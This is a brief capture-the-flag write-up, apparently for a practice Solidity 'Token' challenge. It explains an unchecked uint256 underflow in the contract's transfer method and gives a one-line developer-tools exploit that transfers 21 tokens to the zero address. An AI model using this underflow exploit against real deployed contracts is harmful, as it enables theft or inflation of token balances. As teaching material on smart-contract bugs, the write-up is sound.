### Analysis
The transfer method of Token performs some unchecked arithmetic operations on uint256 (uint is shorthand for uint256 in solidity) integers. That is prone to underflow.

### The Exploit
we can run the code in Developer Tools:
~~~
await contract.transfer('0x0000000000000000000000000000000000000000', 21)
~~~